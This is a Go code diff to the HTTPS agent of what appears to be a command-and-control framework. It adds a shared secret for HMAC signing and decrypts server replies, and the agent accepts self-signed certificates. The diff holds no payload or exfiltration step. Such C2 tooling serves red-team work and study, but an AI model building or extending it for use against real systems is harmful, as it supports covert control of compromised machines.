@@ -6,16 +6,19 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+
+	"c2framework/internals/crypto"
 )
 
 // HTTPSAgent implements the Agent interface for HTTPS
 type HTTPSAgent struct {
 	serverAddr string
-	client     *http.Client
+	client       *http.Client
+	sharedSecret string
 }
 
 // NewHTTPSAgent creates a new HTTPS agent
-func NewHTTPSAgent(serverIP string, serverPort string) *HTTPSAgent {
+func NewHTTPSAgent(serverIP string, serverPort string, sharedSecret string) *HTTPSAgent {
 	// Create TLS config that accepts self-signed certificates
 	tlsConfig := &tls.Config{
 		InsecureSkipVerify: true,
@@ -30,7 +33,8 @@ func NewHTTPSAgent(serverIP string, serverPort string) *HTTPSAgent {
 
 	return &HTTPSAgent{
 		serverAddr: fmt.Sprintf("%s:%s", serverIP, serverPort),
-		client:     client,
+		client:       client,
+		sharedSecret: sharedSecret,
 	}
 }
 
@@ -49,7 +53,7 @@ func (c *HTTPSAgent) Send(ctx context.Context) ([]byte, error) {
 	}
 
 	// Sign the request with HMAC
-	SignRequest(req, body)
+	SignRequest(req, body, c.sharedSecret)
 
 	// Send request
 	resp, err := c.client.Do(req)
@@ -75,6 +79,11 @@ func (c *HTTPSAgent) Send(ctx context.Context) ([]byte, error) {
 		return nil, fmt.Errorf("reading response: %w", err)
 	}
 
-	// Return the raw JSON as message data
-	return respBody, nil
+	// Decrypt the response
+	decrypted, err := crypto.Decrypt(string(respBody), c.sharedSecret)
+	if err != nil {
+		return nil, fmt.Errorf("decrypting response: %w", err)
+	}
+
+	return decrypted, nil
 }
